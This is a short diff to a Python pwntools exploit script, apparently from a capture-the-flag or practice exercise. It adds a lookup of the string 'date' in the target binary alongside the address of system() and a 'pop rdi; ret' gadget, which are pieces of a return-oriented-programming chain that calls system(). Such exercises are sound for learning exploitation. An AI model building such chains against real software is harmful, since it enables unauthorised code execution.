@@ -20,6 +20,9 @@ log.info('Get Addresses')
 info("%#x system", elf.symbols.system)
 system_address = p64(elf.symbols.system)
 
+execute_string = next(elf.search(b'date'))
+info("%#x execute string", execute_string)
+
 rop = ROP(elf)
 POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
 info("%#x POP RDI", POP_RDI)
